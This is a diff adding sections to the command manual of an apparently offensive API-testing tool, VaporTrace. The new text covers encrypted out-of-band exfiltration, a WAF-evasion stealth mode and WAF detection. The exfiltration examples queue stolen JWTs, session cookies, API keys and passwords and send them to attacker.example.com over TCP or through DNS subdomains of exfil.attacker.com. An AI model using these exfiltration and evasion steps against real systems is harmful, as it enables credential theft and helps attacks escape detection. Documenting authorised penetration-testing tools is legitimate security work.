@@ -1,9 +1,20 @@
 # Command Reference Guide
 
 **Document:** manuals/18_COMMAND_REFERENCE.md  
-**Version:** 3.0+  
+**Version:** 3.0+ (Updated Feb 2026)  
 **For:** All users  
 **Complete Reference:** See `help <command>` in VaporTrace
+
+---
+
+## Important: Tab-Specific Features
+
+### F7 (REPORT Tab) - New in Feb 2026
+The Report tab now includes a **Markdown editor with live preview**:
+- **Ctrl+P:** Toggle between EDIT mode (raw Markdown) and PREVIEW mode (colored)
+- **Ctrl+W** or **Ctrl+S:** Save report to disk (works in both modes)
+- **Ctrl+X:** Delete session and clear report
+- **PREVIEW renders:** Colored severity levels (CRITICAL/HIGH/MEDIUM), syntax highlighting
 
 ---
 
@@ -562,6 +573,483 @@ Example:
 [08:33:25] Step 1: map
 [08:33:35] Step 2: bola /api/users/[id]
 [08:33:45] Step 3: loot list
+```
+
+#### `oob config`
+Configure Out-of-Band exfiltration channel.
+
+```bash
+Usage:
+> oob config
+
+Description:
+Interactive setup for encrypted data exfiltration via side channels.
+Configures channel type (custom TCP, DNS, ICMP), encryption keys, and
+server parameters for stealthy data theft.
+
+Supported Channels:
+- custom: Raw TCP with custom protocol header (recommended)
+- dns: Subdomain encoding for firewall bypass
+- icmp: Echo reply tunneling (requires admin)
+
+When to use:
+- Before exfiltrating sensitive data
+- When setting up secure OOB listener
+- To change exfil strategies during assessment
+
+Interactive Options:
+[1] Channel Type: custom, dns, or icmp
+[2] Server Address: attacker.com:9999 (for custom)
+[3] Domain: exfil.attacker.com (for dns)
+[4] Encryption Key: auto-generated 256-bit AES key
+[5] Max Payload: 512 (bytes per message)
+[6] Compression: enabled/disabled
+[7] Retry Attempts: 3 (failed transmissions)
+[8] Transmission Timeout: 5s
+
+Example:
+> oob config
+Choose channel type [1-custom, 2-dns, 3-icmp]: 1
+Enter OOB server address: attacker.example.com:9999
+Enter encryption key (leave blank to auto-generate): [Enter]
+[08:34:30] OOB: Channel configured for custom TCP
+[08:34:30] OOB: Encryption Key (256-bit AES): 7f3a9c...
+[08:34:30] OOB: Server: attacker.example.com:9999
+```
+
+#### `oob queue <type> <source> <data>`
+Queue sensitive data for exfiltration.
+
+```bash
+Usage:
+> oob queue JWT /api/auth eyJ0exAiOiJIUzI1NiIsInR...
+> oob queue SESSION /api/profile PHPSESSID=abc123xyz
+> oob queue API_KEY /admin/settings sk-xxxxxxxxxxxxxxxx
+> oob queue INTERNAL_CONFIG /ssrf/metadata {config_json}
+
+Parameters:
+- <type>: Data classification (JWT, SESSION, API_KEY, PASSWORD, etc)
+- <source>: Where data came from (/endpoint or attack module)
+- <data>: Actual sensitive data to exfiltrate
+
+Description:
+Encrypts data with AES-256-GCM and adds to outbound queue. Queued
+messages are staged for batch transmission via configured OOB channel.
+Data is automatically encrypted before queuing.
+
+When to use:
+- After capturing credentials (from BOLA, BFLA)
+- After SSRF response contains sensitive data
+- Before final exfiltration with 'oob flush'
+
+Encryption:
+- Algorithm: AES-256-GCM (authenticated encryption)
+- Nonce: 12-byte random (prevents replay attacks)
+- Auth Tag: Verifies integrity and origin
+- Base64: Safe for text-based channels (DNS, email)
+
+Example:
+> bola https://api.example.com/api/users/[id]
+[BOLA finds admin user's API key]
+> oob queue API_KEY /api/users/1 sk-prod-xxxxxxxxxxxx
+[08:34:35] OOB QUEUE: Queued 32 bytes (encrypted) for exfiltration
+[08:34:35] OOB QUEUE: Pending messages: 1
+
+# Queue multiple items for batch exfil
+> oob queue SESSION /api/profile SESSIONID=xyz789
+> oob queue PASSWORD /admin/reset admin@example.com:SecurePass123
+> oob queue JWT /api/auth eyJ0exAiOiJIUzI1NiIsInR...
+[08:34:40] OOB QUEUE: Total queued: 3 messages (164 bytes)
+```
+
+#### `oob flush`
+Transmit all queued messages via encrypted OOB channel.
+
+```bash
+Usage:
+> oob flush
+> oob flush --all              (force all retries)
+> oob flush --verbose          (detailed logging)
+
+Description:
+Processes the OOB queue and transmits all queued messages to the
+configured exfiltration server. Uses exponential backoff retry logic
+for failed transmissions. Returns statistics on success rate.
+
+Connection Details:
+- Channel Type: From 'oob config' command
+- Server Address: Configured during setup
+- Encryption: All data sent encrypted with configured key
+- Protocol: Custom TCP header format or DNS queries
+
+When to use:
+- After queuing sensitive data with 'oob queue'
+- During exfiltration phase of attack
+- Before disconnecting from target network
+
+Transmission Process:
+1. Build message with OOB header (magic, version, type, length)
+2. Encrypt payload with AES-256-GCM
+3. Base64 encode for safe transmission
+4. Connect to OOB server via TCP
+5. Send message (retry on failure with exponential backoff)
+6. Update statistics and logs
+
+Example:
+> oob flush
+[08:34:45] OOB FLUSH: Processing 3 queued messages
+[08:34:46] OOB: Connecting to attacker.example.com:9999
+[green]✓ Message 1/3: 32 bytes transmitted (ENCRYPTED) [-]
+[green]✓ Message 2/3: 48 bytes transmitted (ENCRYPTED) [-]
+[08:34:47] OOB: Connection timeout, retrying...
+[green]✓ Message 3/3: 96 bytes transmitted (retry 1/3) [-]
+[08:34:48] OOB FLUSH COMPLETE: 3/3 messages sent successfully
+[08:34:48] OOB: Total exfiltrated: 176 bytes (encrypted)
+```
+
+#### `oob status`
+View current exfiltration channel statistics.
+
+```bash
+Usage:
+> oob status
+> oob status --detailed      (includes full config)
+
+Description:
+Displays real-time statistics on OOB channel:
+- Messages sent and failed
+- Total bytes exfiltrated
+- Pending messages in queue
+- Channel configuration
+- Success rate percentage
+
+When to use:
+- To verify OOB operations
+- Monitor exfiltration progress
+- Troubleshoot connection issues
+
+Example:
+> oob status
+[blue]═══════════════════════════════════════════════════════════[-]
+[white]OOB EXFILTRATION CHANNEL STATUS                          [-]
+[blue]═══════════════════════════════════════════════════════════[-]
+  Channel Type:               custom
+  Server Address:             attacker.example.com:9999
+  Encryption Algorithm:       AES-256-GCM
+  Encryption Key (fingerprint): 7f3a9c2e...
+  
+  [magenta]Transmission Statistics:[-]
+  ├─ Sent Messages:           42
+  ├─ Failed Messages:         1
+  ├─ Total Bytes Exfiltrated: 15,234 bytes
+  ├─ Success Rate:            97.7%
+  └─ Pending in Queue:        8 messages
+  
+  [cyan]Recent Activity:[-]
+  ├─ Last Transmission:       08:34:48 (12 seconds ago)
+  ├─ Last Failed:             08:33:15 (retry successful)
+  ├─ Connection Status:       ✓ Connected
+  └─ Next Scheduled Flush:    automatic (pending queue exists)
+[blue]═══════════════════════════════════════════════════════════[-]
+```
+
+#### `oob dns <domain>`
+Configure DNS exfiltration (for firewall bypass).
+
+```bash
+Usage:
+> oob dns exfil.attacker.com
+> oob dns
+
+Description:
+Set up DNS-based exfiltration for environments where TCP outbound is
+blocked. Encodes data in DNS subdomain labels (max 63 bytes per label).
+Data is split across multiple DNS queries to same authoritative nameserver.
+
+When to use:
+- When custom TCP port is blocked
+- In restrictive network environments
+- For maximum stealth (DNS is rarely monitored)
+
+DNS Exfiltration Process:
+1. Queue data with 'oob queue' command
+2. Data is base64-encoded and split into 60-byte chunks
+3. Each chunk becomes DNS subdomain label
+4. Query sent to attacker's authoritative nameserver
+5. Attacker captures query in DNS logs
+6. Decode base64 to recover plaintext
+
+Example:
+> oob dns exfil.attacker.com
+[08:34:55] OOB DNS: Configured for exfil.attacker.com
+[08:34:55] OOB: Encoding: base64 (60 bytes per label)
+
+> oob queue JWT /api/auth eyJ0exAiOiJIUzI1NiIsInR...
+> oob flush
+[08:35:00] OOB DNS: Querying abc123def456.xyz789uvw.exfil.attacker.com
+[08:35:01] OOB DNS: Querying ijklmno456pqr.uvwxyz123.exfil.attacker.com
+[08:35:02] OOB DNS: Exfiltration complete (split across 2 DNS queries)
+
+# On attacker's DNS server, decode captured queries:
+$ dig @attacker.com abc123def456.xyz789uvw.exfil.attacker.com
+# Extract 'abc123def456xyz789uvw', base64 decode to recover JWT
+```
+
+---
+
+### 🕵️ Stealth & Evasion Control
+
+#### `stealth <mode>`
+Set preset evasion configuration (Aggressive, Fast, Silent, Debug).
+
+```bash
+Usage:
+> stealth aggressive
+> stealth fast
+> stealth silent
+> stealth debug
+
+Parameters:
+- mode: aggressive | fast | silent | debug
+
+Description:
+Switches evasion profile globally. Each mode balances speed vs stealth:
+
+**Aggressive** (Default):
+  - All evasion enabled (jitter, thinking time, backoff, obfuscation, encoding)
+  - Speed Multiplier: 1.0x (normal)
+  - Best for: Balanced testing, moderate WAF environments
+
+**Fast**:
+  - Reduced delays (thinking time 50%, disable encoding)
+  - Speed Multiplier: 0.5x (twice as fast)
+  - Best for: Quick reconnaissance, permissive WAFs
+  - Trade-off: Easier to detect
+
+**Silent**:
+  - Maximum evasion (all techniques active, extra delays)
+  - Speed Multiplier: 2.0x (half speed)
+  - Best for: Stealth-critical targets, advanced WAF
+  - Trade-off: Very slow (5-10 minutes per endpoint)
+
+**Debug**:
+  - All evasion disabled
+  - Speed Multiplier: 1.0x
+  - Best for: Testing, troubleshooting, baseline measurements
+  - Output: No delays, no obfuscation, raw traffic
+
+When to use:
+- At start of engagement (set once, applies to all modules)
+- When changing targets with different WAF strength
+- When response patterns suggest detection
+
+Individual Techniques Affected by Stealth Mode:
+- Stochastic Jitter (10-150ms Gaussian distribution)
+- Contextual Thinking Time (10-3000ms by request type)
+- Rate-Limit Backoff (exponential 429 handling)
+- Path Obfuscation (cache-busters, path parameters)
+- Payload Encoding (gzip, deflate, whitespace randomization)
+
+Example:
+> stealth silent
+[green::b]STEALTH:[-] Mode set to [green]SILENT[-] (maximum evasion, 2x speed)[-:-:-]
+
+> analyze
+[yellow]STEALTH:[-] Sleep skipped (toggle disabled)
+[cyan]EVASION:[-] Applied stochastic jitter (100ms)
+[blue]THINKING:[-] Exploitation request: Heavy jitter (800-3000ms)
+```
+
+#### `stealth status`
+View current evasion configuration and statistics.
+
+```bash
+Usage:
+> stealth status
+
+Description:
+Displays current evasion profile and which techniques are active. Shows:
+- Current stealth mode (Aggressive, Fast, Silent, Debug)
+- Global speed multiplier (0.1x to 5.0x)
+- Individual feature toggles (Jitter, Thinking, Backoff, Obfuscation, Encoding)
+- Statistics from recent requests
+
+Example:
+> stealth status
+[cyan]STEALTH STATUS[-]
+  Mode: Silent | Multiplier: 2.0x
+  Jitter: [green]ON | Thinking: [green]ON | Backoff: [green]ON | Obfuscation: [green]ON | Encoding: [green]ON
+```
+
+#### `stealth toggle <feature> <on|off>`
+Enable/disable individual evasion features.
+
+```bash
+Usage:
+> stealth toggle jitter on
+> stealth toggle thinking off
+> stealth toggle backoff on
+> stealth toggle obfuscation on
+> stealth toggle encoding off
+
+Parameters:
+- feature: jitter | thinking | backoff | obfuscation | encoding
+- state: on | off
+
+Description:
+Fine-tune evasion by toggling individual techniques. Allows selective
+disabling when specific techniques cause problems or are unnecessary.
+
+Features:
+- **jitter**: Stochastic Gaussian delays (10-150ms) between requests
+- **thinking**: Contextual delays by request type (GET: 10-50ms, POST: 800-3000ms)
+- **backoff**: Automatic 429 rate-limit handling with exponential backoff
+- **obfuscation**: Path/parameter noise injection (cache-busters, path params)
+- **encoding**: Payload encoding randomization (gzip, deflate, whitespace)
+
+When to use:
+- To disable specific techniques causing false positives
+- When testing specific evasion effectiveness
+- For fine-grained stealth configuration
+
+Example:
+> stealth toggle encoding off
+[cyan]STEALTH:[-] Payload Encoding [red]DISABLED
+> stealth toggle jitter on
+[cyan]STEALTH:[-] Jitter [green]ENABLED
+```
+
+#### `stealth multiplier <0.1-5.0>`
+Scale all evasion sleep durations globally.
+
+```bash
+Usage:
+> stealth multiplier 0.5    (2x speed, half delays)
+> stealth multiplier 1.0    (normal speed)
+> stealth multiplier 2.0    (half speed, double delays)
+> stealth multiplier 3.0    (3x slowdown for extreme stealth)
+
+Parameters:
+- multiplier: 0.1 to 5.0 (decimal number)
+
+Description:
+Global speed/stealth adjustment without changing modes. Multiplies all
+thinking time and jitter durations by the specified factor. Useful for
+fine-tuning based on real-time WAF responses.
+
+Examples:
+- 0.1: 10x speed boost (risky, for quick mapping)
+- 0.5: 2x speed (aggressive testing)
+- 1.0: Normal speed (default)
+- 2.0: 2x slowdown (maximum stealth)
+- 3.0-5.0: Extreme slowdown for stealth-critical targets
+
+Calculation:
+  Actual Delay = Base Delay × Global Multiplier × Stealth Mode Multiplier
+
+Example (POST request):
+  Base: 800-3000ms
+  With multiplier 2.0: 1600-6000ms (very slow)
+  Thinking time toggleable with: stealth toggle thinking off
+
+When to use:
+- Real-time response to WAF detection patterns
+- Progressive tuning during engagement
+- Testing specific delay thresholds
+
+Example:
+> stealth multiplier 0.5
+[cyan]STEALTH:[-] Global evasion multiplier set to 0.5x
+> bola https://target.com/api/users/[id]
+[cyan]EVASION:[-] Applied stochastic jitter (50ms - halved)
+[blue]THINKING:[-] Exploitation request: Heavy jitter (400-1500ms - halved)
+```
+
+#### `evasion <technique>`
+Test individual evasion techniques in isolation.
+
+```bash
+Usage:
+> evasion http2        (Test HTTP/2 fingerprinting)
+> evasion path         (Test path obfuscation)
+> evasion encoding     (Test payload encoding)
+> evasion all          (Run all tests)
+
+Description:
+Test evasion techniques against target to see effectiveness. Sends
+probe requests and compares responses to baseline. Helps identify which
+techniques work against specific WAF/target combination.
+
+Techniques Tested:
+- **http2**: HTTP/2 ClientHello fingerprinting (Cloudflare bypass)
+- **path**: Cache-buster + path parameter injection (regex bypass)
+- **encoding**: Gzip/deflate payload encoding (signature bypass)
+- **timing**: Jitter + thinking time consistency
+- **all**: Comprehensive evasion effectiveness test
+
+Output:
+- Baseline response (no evasion)
+- Response with technique applied
+- Detection comparison
+- Effectiveness estimate
+
+When to use:
+- Initial reconnaissance against new WAF
+- After detecting blocks/challenges
+- To find which evasion works best
+- Before committing to full attack
+
+Example:
+> evasion path
+[cyan]EVASION TEST:[-] Testing path obfuscation...
+[08:33:20] Baseline: /api/v1/users [200 OK]
+[08:33:25] With obfuscation: /api/v1/users?_debug=0&_t=123 [200 OK]
+[08:33:30] Detection: No difference detected
+[yellow]RESULT:[-] Path obfuscation: EFFECTIVE (1.0 bypass ratio)
+```
+
+#### `waf detect`
+Probe target for WAF presence and type.
+
+```bash
+Usage:
+> waf detect
+> waf detect https://target.com (optional target override)
+
+Description:
+Sends characteristic requests to identify WAF type and settings:
+- ModSecurity (open-source, common)
+- Cloudflare (enterprise, advanced ML)
+- Akamai (high-performance, strict)
+- DataDome (ML-based, very aggressive)
+- Custom/Unknown
+
+Detection Methods:
+1. Banner detection (common WAF headers)
+2. Error page fingerprinting (unique error messages)
+3. Challenge behavior (CAPTCHA, JavaScript redirect)
+4. Rate-limit patterns (response delays, backoff behavior)
+5. Block pages (HTML signatures)
+
+When to use:
+- First reconnaissance step
+- Before selecting evasion strategy
+- To determine expected difficulty level
+
+Output:
+- Likely WAF type with confidence
+- Known bypass techniques for that WAF
+- Recommended stealth mode
+- Difficulty rating
+
+Example:
+> waf detect
+[08:33:35] WAF DETECTION: Scanning target...
+[08:33:45] DETECTED: Cloudflare (95% confidence)
+[08:33:45]   Type: Enterprise WAF + DDoS Protection
+[08:33:45]   Difficulty: HARD (ML-based detection)
+[08:33:45]   Recommended: Silent mode + HTTP/2 evasion
+[08:33:45]   Bypass Rate: 5-15% (very challenging)
 ```
 
 ---
